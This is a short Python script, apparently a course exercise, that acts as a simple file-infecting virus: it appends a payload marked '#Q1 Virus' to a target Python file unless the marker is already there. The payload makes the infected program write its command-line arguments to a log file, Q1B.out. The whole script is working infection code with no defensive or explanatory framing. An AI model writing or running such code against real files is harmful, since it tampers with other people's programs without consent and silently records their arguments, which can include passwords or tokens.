import re
import sys
file = sys.argv[1]
virus = """
import sys
#Q1 Virus
with open("Q1B.out", "a") as f:
    for argument in sys.argv:
        f.write(argument + " ")"""
with open(file, "r+") as f:
    infected = False
    for line in f:
        if "#Q1 Virus" in line:
            infected = True
    if not infected:
        f.write(virus)

